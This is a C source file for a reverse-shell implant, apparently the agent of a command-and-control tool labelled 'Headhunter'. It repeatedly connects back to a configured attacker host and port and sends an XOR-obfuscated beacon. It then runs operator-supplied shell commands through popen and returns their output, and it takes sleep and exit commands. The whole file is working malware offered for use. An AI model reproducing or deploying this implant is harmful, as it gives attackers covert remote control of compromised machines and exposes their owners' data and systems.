#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <signal.h>
#include "helpers.c"
#include "payload_common.h"
#include <pthread.h>

#define MAXBUF 65536

#define SIZE 1024

char* key = KEY;
int connection_established;
int sock;
char buf[MAXBUF];
int bufsize;
int sleeptime = 20;

int main(void)
{
	signal(SIGCHLD, SIG_IGN);

	char* ip = LHOST;
	int port = PORT;
	int n = 0;
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	int keylen = strlen(key);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	do {
		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
	} while(connection_established != 0);


	char* beacon = "--HEADHUNTER BEACON--";
	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);

	while (connection_established == 0)
	{
		
		send(sock, xorbeacon, strlen(beacon), 0);
		n = read(sock, buf, MAXBUF);
		char* xorbuf = XOR(buf, key, n, keylen);
		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
			sleep(sleeptime);
		}
		else if(str_starts_with(xorbuf, "--HEADHUNTER EXIT--") == 0){
		
			return 0;
		}
		else{
			
			if(str_starts_with(xorbuf, "shell") == 0)
			{
				int status;
				pid_t child_pid;
				FILE* fp;
				
				char* cmd = split(xorbuf, " ");			
	
				if((child_pid = fork()) == 0)
				{

					// Create a child process and run command inside of it
					fp = popen(cmd, "r");
					if(fp == NULL) {
					    char* error = "Failed to run command\n";
					    char* xorerror = XOR(error, key, strlen(error), keylen);
					    write(sock, xorerror, strlen(error));
					    
					}
					char path[2050];
					char command[12000];
					char* reset = "\n";
					while (fgets(path, sizeof(path), fp) != NULL) {
					    strncat(command, path, strlen(path));
					}
					strncat(command, reset, strlen(reset));
					char* xordata = XOR(command, key, strlen(command), keylen);
					write(sock, xordata, strlen(command));
					free(xordata);
					
					return 0;
				}

				waitpid(child_pid, &status, WNOHANG);

			}
			else if(str_starts_with(xorbuf, "sleep") == 0){
				char* cmd = split(xorbuf, " ");
				sleeptime = atoi(cmd);
				char* sleepmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
				char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
				write(sock, xorsleepmsg, strlen(sleepmsg));
				free(xorsleepmsg);
			}
			else if(strncmp(xorbuf, "\n", 1) == 0)
			{
				char* xornewline = XOR("\n", key, 1, keylen);
				write(sock, xornewline, 1);
				free(xornewline);
		
			}
			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				write(sock, xorinvalid, strlen(MSG_INVALID));
			}		
			
			memset(buf, '\0', strlen(buf));
			free(xorbuf);
		}
	}

	return 0;
}
